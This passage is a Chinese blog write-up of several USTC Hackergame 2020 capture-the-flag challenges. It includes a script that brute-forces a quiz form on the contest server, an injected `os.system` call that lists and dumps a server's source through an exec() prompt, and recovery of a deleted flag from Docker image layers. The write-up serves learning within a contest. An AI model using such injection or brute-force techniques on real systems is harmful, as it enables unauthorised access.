零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 